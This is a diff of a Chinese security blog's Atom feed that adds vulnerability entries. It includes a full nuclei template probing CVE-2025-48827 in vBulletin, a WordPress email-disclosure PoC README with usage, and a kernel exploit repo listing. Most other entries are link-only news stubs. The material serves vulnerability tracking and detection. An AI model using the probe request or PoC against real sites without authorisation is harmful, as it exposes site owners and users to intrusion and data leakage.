@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-07-01T07:15:16.673Z</updated>
+  <updated>2025-07-01T07:45:56.661Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,355 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>vBulletin 认证绕过漏洞</title>
+    <link href="http://example.com/2025/07/01/github_2959425650/"/>
+    <id>http://example.com/2025/07/01/github_2959425650/</id>
+    <published>2025-07-01T07:45:56.665Z</published>
+    <updated>2025-07-01T07:45:56.661Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> vBulletin 认证绕过漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-48827</li></ul><p><strong>漏洞类型：</strong> 权限绕过</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> vBulletin 5.0.0至5.7.5版本和6.0.0至6.0.3版本在PHP 8.1或更高版本上存在认证绕过漏洞，允许未认证的攻击者远程调用受保护的方法。由于PHP 8.1对ReflectionMethod::invoke()及相关方法的内部调整，默认允许通过PHP的Reflection API调用受保护&#x2F;私有方法。成功利用此漏洞的攻击者可以以web服务器用户身份执行任意系统命令，导致系统完全被控制。</p><p><strong>产品厂商：</strong> vbulletin</p><p><strong>产品名称：</strong> vbulletin</p><p><strong>影响版本：</strong> 5.0.0 &lt;&#x3D; version &lt;&#x3D; 5.7.5, 6.0.0 &lt;&#x3D; version &lt;&#x3D; 6.0.3</p><p><strong>搜索语法：</strong> app&#x3D;”vBulletin”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/f2e4390742143dbd00876089826579108f72e640/http%2Fcves%2F2025%2FCVE-2025-48827.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/f2e4390742143dbd00876089826579108f72e640/http%2Fcves%2F2025%2FCVE-2025-48827.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">48827</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> vBulletin <span class="hljs-operator">-</span> Authentication Bypass<br>  <span class="hljs-params">author:</span> pszyszkowski<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    vBulletin <span class="hljs-number">5.0</span>.<span class="hljs-number">0</span> through <span class="hljs-number">5.7</span>.<span class="hljs-number">5</span> and <span class="hljs-number">6.0</span>.<span class="hljs-number">0</span> through <span class="hljs-number">6.0</span>.<span class="hljs-number">3</span> contain an authentication bypass caused by unauthenticated access to protected API controllers on PHP <span class="hljs-number">8.1</span> <span class="hljs-keyword">or</span> later, letting unauthenticated attackers invoke protected methods remotely.<br>    Starting from PHP <span class="hljs-number">8.1</span>, due to an internal adjustment to handling of ReflectionMethod::invoke() and similar methods, it now allows — by default — invocation of protected <span class="hljs-symbol">/</span> private methods when using PHP&#x27;s Reflection API.<br>  <span class="hljs-params">impact:</span> |<br>    Successful exploitation allows unauthenticated remote attackers to execute arbitrary system commands as the web server user, resulting <span class="hljs-keyword">in</span> full system compromise.<br>  <span class="hljs-params">remediation:</span> |<br>    Upgrade to vBulletin <span class="hljs-number">6.0</span>.<span class="hljs-number">4</span><span class="hljs-operator">+</span> before upgrading to PHP <span class="hljs-number">8.1</span>.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//karmainsecurity.com/dont-call-that-protected-method-vbulletin-rce</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2025-48827</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:a:vbulletin:vbulletin:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:C<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">10</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">48827</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">424</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">vendor:</span> vbulletin<br>    <span class="hljs-params">product:</span> vbulletin<br>    <span class="hljs-params">fofa-query:</span> app<span class="hljs-operator">=</span><span class="hljs-string">&quot;vBulletin&quot;</span><br>    <span class="hljs-params">shodan-query:</span> http.component:<span class="hljs-string">&quot;vBulletin&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2025,rce,vbulletin,intrusive<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">rand_string:</span> <span class="hljs-string">&quot;&#123;&#123;to_lower(rand_base(5))&#125;&#125;&quot;</span><br>  <span class="hljs-params">rand_value:</span> <span class="hljs-string">&quot;&#123;&#123;to_lower(rand_text_alpha(5))&#125;&#125;&quot;</span><br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/ajax/api/ad/wrapAdTemplate</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        <span class="hljs-attr">template</span><span class="hljs-operator">=</span>&#123;&#123;rand_string&#125;&#125;&amp;id_name<span class="hljs-operator">=</span>&#123;&#123;rand_value&#125;&#125;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> status_code <span class="hljs-operator">==</span> <span class="hljs-number">200</span><br>          <span class="hljs-operator">-</span> contains_all(body,&#x27;&#123;&#123;rand_string&#125;&#125;&#x27;,&#x27;&#123;&#123;rand_value&#125;&#125;&#x27;)<br>        <span class="hljs-params">condition:</span> and<br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; vBulletin 认证绕过漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>WordPress User Email Disclosure Vulnerability</title>
+    <link href="http://example.com/2025/07/01/github_4166988277/"/>
+    <id>http://example.com/2025/07/01/github_4166988277/</id>
+    <published>2025-07-01T07:45:40.115Z</published>
+    <updated>2025-07-01T07:45:40.109Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> WordPress User Email Disclosure Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-5561</li></ul><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> 该漏洞允许攻击者通过<code>/wp-json/wp/v2/users</code> API端点枚举和泄露WordPress用户的电子邮件地址。</p><p><strong>产品厂商：</strong> WordPress</p><p><strong>产品名称：</strong> WordPress</p><p><strong>来源：</strong> <a href="https://github.com/dthkhang/CVE-2023-5561-PoC">https://github.com/dthkhang/CVE-2023-5561-PoC</a></p><p><strong>类型：</strong> CVE-2023:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>CVE-2023-5561.py</li><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="PoC-CVE-2023-5561-WordPress-User-Email-Disclosure"><a href="#PoC-CVE-2023-5561-WordPress-User-Email-Disclosure" class="headerlink" title="PoC CVE-2023-5561 - WordPress User Email Disclosure"></a>PoC CVE-2023-5561 - WordPress User Email Disclosure</h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>This script exploits the CVE-2023-5561 vulnerability in WordPress to enumerate and disclose user email addresses via the <code>/wp-json/wp/v2/users</code> API endpoint.</p><h3 id="Requirements"><a href="#Requirements" class="headerlink" title="Requirements"></a>Requirements</h3><ul><li>Python 3.x</li><li><code>requests</code> library</li></ul><p>Install the required library:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install requests<br></code></pre></td></tr></table></figure><h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><ol><li>Identify the root URL of the target WordPress site (e.g., <code>https://target.com</code>).</li><li>Run the script with the following syntax:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python CVE-2023-5561.py &lt;target site root url&gt;<br></code></pre></td></tr></table></figure><p>Example:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python CVE-2023-5561.py https://target.com<br></code></pre></td></tr></table></figure><h3 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h3><p>The script will list found users and attempt to brute-force and reveal the full email address for each user if possible.</p><h3 id="Legal-Notice"><a href="#Legal-Notice" class="headerlink" title="Legal Notice"></a>Legal Notice</h3><ul><li>This script is for authorized security testing and educational purposes only.</li><li>Do not use it for malicious purposes or against systems you do not have permission to test.</li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; WordPress User Email Disclosure Vulnera</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="CVE-2023:github search" scheme="http://example.com/tags/CVE-2023-github-search/"/>
+    
+    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>vBulletin Authentication Bypass Vulnerability</title>
+    <link href="http://example.com/2025/07/01/github_1674448598/"/>
+    <id>http://example.com/2025/07/01/github_1674448598/</id>
+    <published>2025-07-01T07:45:29.697Z</published>
+    <updated>2025-07-01T07:45:29.692Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> vBulletin Authentication Bypass Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-48827</li></ul><p><strong>漏洞类型：</strong> 权限绕过</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> vBulletin 5.0.0至5.7.5和6.0.0至6.0.3版本在PHP 8.1或更高版本上存在认证绕过漏洞，允许未认证的攻击者远程调用受保护的方法。</p><p><strong>产品厂商：</strong> vBulletin</p><p><strong>产品名称：</strong> vBulletin</p><p><strong>影响版本：</strong> 5.0.0 through 5.7.5 and 6.0.0 through 6.0.3</p><p><strong>搜索语法：</strong> http.html:”powered by vbulletin”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12506">https://github.com/projectdiscovery/nuclei-templates/issues/12506</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>vBulletin 5.0.0 through 5.7.5 and 6.0.0 through 6.0.3 contain an authentication bypass caused by unauthenticated access to protected API controllers on PHP 8.1 or later, letting unauthenticated attackers invoke protected methods remotely.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://karmainsecurity.com/dont-call-that-protected-method-vbulletin-rce">https://karmainsecurity.com/dont-call-that-protected-method-vbulletin-rce</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:wiseep&#x2F;CVE-2025-48827.git</li><li><a href="https://github.com/wiseep/CVE-2025-48827">https://github.com/wiseep/CVE-2025-48827</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:0xgh057r3c0n&#x2F;CVE-2025-48827.git</li><li><a href="https://github.com/0xgh057r3c0n/CVE-2025-48827">https://github.com/0xgh057r3c0n/CVE-2025-48827</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-http-html-powered-by-vbulletin"><a href="#Shodan-Query-http-html-powered-by-vbulletin" class="headerlink" title="Shodan Query: http.html:&quot;powered by vbulletin&quot;"></a>Shodan Query: <code>http.html:&quot;powered by vbulletin&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; vBulletin Authentication Bypass Vulnera</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CVE-2023-32233</title>
+    <link href="http://example.com/2025/07/01/github_1492489299/"/>
+    <id>http://example.com/2025/07/01/github_1492489299/</id>
+    <published>2025-07-01T07:45:15.439Z</published>
+    <updated>2025-07-01T07:45:15.436Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> CVE-2023-32233</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-32233</li></ul><p><strong>漏洞类型：</strong> 其他</p><p><strong>漏洞描述：</strong> 该漏洞的具体细节未在提供的信息中明确说明，但从相关文件和配置更改来看，可能涉及Linux内核的配置问题，如禁用CONFIG_WERROR和CONFIG_RETPOLINE，以及启用用户命名空间和网络过滤功能。</p><p><strong>来源：</strong> <a href="https://github.com/enlist12/CVE-2023-32233">https://github.com/enlist12/CVE-2023-32233</a></p><p><strong>类型：</strong> CVE-2023:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li><li>bzImage</li><li>exploit</li><li>myconfig</li><li>rootfs</li><li>start.sh</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><p>disable CONFIG_WERROR<br>disable CONFIG_RETPOLINE<br>enable  User namespaces<br>enable  CONFIG_NETFILTER<br>enable  CONFIG_NF_TABLES</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; CVE-2023-32233&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/st</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="CVE-2023:github search" scheme="http://example.com/tags/CVE-2023-github-search/"/>
+    
+    <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【高危漏洞预警】 Akamai CloudTest soap XXE漏洞（CVE-2025-49493）</title>
+    <link href="http://example.com/2025/07/01/weixin_3675465964/"/>
+    <id>http://example.com/2025/07/01/weixin_3675465964/</id>
+    <published>2025-07-01T07:44:00.392Z</published>
+    <updated>2025-07-01T07:44:00.390Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 飓风网络安全</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/Ul9EaQopCtAiDh3XDXCLaA">https://mp.weixin.qq.com/s/Ul9EaQopCtAiDh3XDXCLaA</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 飓风网络安全&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/Ul9EaQopCtAiDh3XDXCLaA&quot;&gt;https://mp.weixin.qq</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="飓风网络安全" scheme="http://example.com/tags/%E9%A3%93%E9%A3%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>在现代变电站中保护保护继电器</title>
+    <link href="http://example.com/2025/07/01/weixin_1582135830/"/>
+    <id>http://example.com/2025/07/01/weixin_1582135830/</id>
+    <published>2025-07-01T07:41:23.034Z</published>
+    <updated>2025-07-01T07:41:23.030Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/dStW0hIW6ogWGizN26Fsug">https://mp.weixin.qq.com/s/dStW0hIW6ogWGizN26Fsug</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/dStW0hIW6ogWGizN26Fsug&quot;&gt;https://mp.weixin.qq.c</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>黑客入侵挪威水坝，导致阀门全开</title>
+    <link href="http://example.com/2025/07/01/weixin_3832121075/"/>
+    <id>http://example.com/2025/07/01/weixin_3832121075/</id>
+    <published>2025-07-01T07:41:22.683Z</published>
+    <updated>2025-07-01T07:41:22.682Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/AINt9_jwdVx_elPBZyNehA">https://mp.weixin.qq.com/s/AINt9_jwdVx_elPBZyNehA</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/AINt9_jwdVx_elPBZyNehA&quot;&gt;https://mp.weixin.qq.c</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Open VSX Registry 的一个漏洞威胁数百万开发者</title>
+    <link href="http://example.com/2025/07/01/weixin_4158803738/"/>
+    <id>http://example.com/2025/07/01/weixin_4158803738/</id>
+    <published>2025-07-01T07:41:22.356Z</published>
+    <updated>2025-07-01T07:41:22.354Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/l4fWb0pYrEaWl-UbKZ7tOA">https://mp.weixin.qq.com/s/l4fWb0pYrEaWl-UbKZ7tOA</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/l4fWb0pYrEaWl-UbKZ7tOA&quot;&gt;https://mp.weixin.qq.c</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>x64dbg 迎来了重大新版本发布</title>
+    <link href="http://example.com/2025/07/01/weixin_761829626/"/>
+    <id>http://example.com/2025/07/01/weixin_761829626/</id>
+    <published>2025-07-01T07:41:22.032Z</published>
+    <updated>2025-07-01T07:41:22.030Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/tmUbDFBICF-_MoNg4GPjJw">https://mp.weixin.qq.com/s/tmUbDFBICF-_MoNg4GPjJw</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/tmUbDFBICF-_MoNg4GPjJw&quot;&gt;https://mp.weixin.qq.c</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>两起针对两家医院的勒索软件攻击如何导致欧洲两人死亡</title>
+    <link href="http://example.com/2025/07/01/weixin_3208649082/"/>
+    <id>http://example.com/2025/07/01/weixin_3208649082/</id>
+    <published>2025-07-01T07:41:21.678Z</published>
+    <updated>2025-07-01T07:41:21.674Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/-QKgQEXFdRAEZ-1J95WysQ">https://mp.weixin.qq.com/s/-QKgQEXFdRAEZ-1J95WysQ</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/-QKgQEXFdRAEZ-1J95WysQ&quot;&gt;https://mp.weixin.qq.c</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Chrome 0day漏洞任意代码执行被野外利用</title>
+    <link href="http://example.com/2025/07/01/weixin_3044155063/"/>
+    <id>http://example.com/2025/07/01/weixin_3044155063/</id>
+    <published>2025-07-01T07:41:21.348Z</published>
+    <updated>2025-07-01T07:41:21.346Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/mfzflnJymz2qD3jF6HSLMw">https://mp.weixin.qq.com/s/mfzflnJymz2qD3jF6HSLMw</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/mfzflnJymz2qD3jF6HSLMw&quot;&gt;https://mp.weixin.qq.c</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>网传6000 万名 Verizon 客户在暗网出售</title>
+    <link href="http://example.com/2025/07/01/weixin_3626151469/"/>
+    <id>http://example.com/2025/07/01/weixin_3626151469/</id>
+    <published>2025-07-01T07:41:21.022Z</published>
+    <updated>2025-07-01T07:41:21.018Z</updated>
+    
